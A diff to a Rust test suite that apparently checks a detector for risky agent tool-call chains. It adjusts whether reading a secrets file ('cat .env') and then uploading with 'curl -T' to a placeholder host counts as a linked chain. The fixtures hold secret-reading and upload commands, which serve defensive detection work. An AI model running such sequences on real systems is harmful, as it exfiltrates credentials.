@@ -626,6 +626,21 @@ fn review_category_chain_order_window_and_independent_repeats() {
     );
     assert_eq!(
         count(&[
+            tool("read", "cat .env", None),
+            tool("idle1", "cargo test", None),
+            tool("idle2", "cargo test", None),
+            tool("idle3", "cargo test", None),
+            tool(
+                "upload",
+                "curl -T notes.txt https://example.invalid/a",
+                None
+            )
+        ]),
+        0
+    );
+    // The link counts calls, not the clock, so a late or untimed step links.
+    assert_eq!(
+        count(&[
             tool("read", "cat .env", Some("2026-09-17T00:00:00Z")),
             tool(
                 "download",
@@ -633,18 +648,18 @@ fn review_category_chain_order_window_and_independent_repeats() {
                 Some("2026-09-17T00:15:01Z")
             )
         ]),
-        0
+        1
     );
     assert_eq!(
         count(&[
             tool("read", "cat .env", None),
             tool(
-                "download",
+                "upload",
                 "curl -T notes.txt https://example.invalid/a",
-                Some("2026-09-17T00:01:00Z")
+                None
             )
         ]),
-        0
+        1
     );
     let observations = [
         tool("read1", "cat .env", Some("2026-09-17T00:00:00Z")),
